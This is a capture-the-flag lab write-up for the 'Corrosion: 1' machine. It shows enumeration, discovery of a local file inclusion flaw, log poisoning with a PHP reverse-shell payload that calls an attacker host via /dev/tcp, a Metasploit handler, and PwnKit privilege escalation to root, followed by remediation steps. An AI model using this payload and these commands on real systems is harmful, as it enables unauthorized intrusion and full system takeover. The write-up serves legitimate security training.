# Corrosion: 1 — TryHackMe / VulnHub CTF

**Objective**  
Gain initial access and escalate privileges on a Linux target by exploiting Local File Inclusion and leveraging a known kernel vulnerability.

---

## 🔍 Discovery

**Goal:** Identify the target and exposed services.

Ran a basic Nmap scan:

```bash
nmap -sV -Pn <target-ip>
```

**Discovered open ports:**
- Port 80 — Apache HTTP
- Port 22 — SSH

➡ These services indicate remote access points and web interaction — perfect starting points.

---

## 🕵️ Enumeration

**Goal:** Uncover hidden directories and files

**Step 1 — Gobuster on root:**

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,log
```

**Findings:**
- `/tasks`
- `/blog-post`

**Step 2 — Gobuster on `/blog-post`:**

```bash
gobuster dir -u http://<target-ip>/blog-post/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,log
```

**Discovered:**
- `/archives` → Contained `randylogs.php`
- `/uploads`

---

## ⚙️ Foothold (LFI Discovery)

**Observation:**  
The file `randylogs.php` hinted at a Local File Inclusion vulnerability.

**Fuzzed using wfuzz:**

```bash
wfuzz -u http://<target-ip>/blog-post/archives/randylogs.php?FUZZ=/var/log/auth.log -w /usr/share/wordlists/dirb/common.txt --hw=65 --hh=0
```

✅ Found vulnerable `file` parameter.

---

## 🔓 Gaining Access (Log Poisoning via LFI)

Exploited LFI to read `/var/log/auth.log`.

**Injected reverse shell into SSH logs using Netcat:**

```bash
nc <target-ip> 22
<?php system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"'); ?>
```

**Triggered payload via LFI:**

```
http://<target-ip>/blog-post/archives/randylogs.php?file=/var/log/auth.log
```

**Listener (Metasploit):**

```bash
use exploit/multi/handler
set payload cmd/unix/reverse_bash
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run
```

🎉 Reverse shell gained as `www-data`.

---

## 🚀 Shell Upgrade

**Upgraded to Meterpreter:**

```bash
sessions
sessions -u <session_id>
```

Now had a stable and interactive session.

---

## 🔐 Privilege Escalation

**Used Metasploit Local Exploit Suggester:**

```bash
use post/multi/recon/local_exploit_suggester
set SESSION <meterpreter_id>
run
```

**Suggested exploit:**  
- CVE-2021-4034 (PwnKit)

```bash
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION <meterpreter_id>
run
```

🎯 Result: Root access obtained!

---

## 🛡️ Remediation Steps

1. **Review Web Server Configurations**
   - Disable directory listing
   - Restrict direct access to `/archives`
   - Validate allowed upload types

2. **Sanitize User Input**
   - Whitelist acceptable parameters
   - Encode and validate file paths
   - Block directory traversal patterns

3. **Patch Known Vulnerabilities**
   - Update `polkit` to patch CVE-2021-4034
   - Regularly apply security updates to system packages and kernel

---

## 🏁 Status: **Rooted**

Successfully exploited LFI and escalated to root using a known kernel vulnerability.

